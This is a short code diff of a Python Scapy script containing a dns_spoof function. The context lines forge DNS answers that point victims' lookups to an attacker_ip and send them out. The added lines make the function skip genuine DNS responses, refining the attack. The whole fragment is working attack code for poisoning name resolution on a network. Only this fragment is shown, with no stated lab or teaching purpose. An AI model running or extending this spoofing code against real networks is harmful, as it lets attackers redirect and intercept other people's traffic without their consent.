@@ -82,6 +82,10 @@ def dns_spoof(pkt):
                               an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=attacker_ip))
             sendp(spoofed_pkt, verbose=0)
             print(f"Sent spoofed DNS response to {pkt[IP].src}")
+            
+    # if dns response drop the packet
+    if DNS in pkt and pkt[DNS].qr == 1:
+        return
 
 def stop_filter(pkt):
     return stop_sniffing
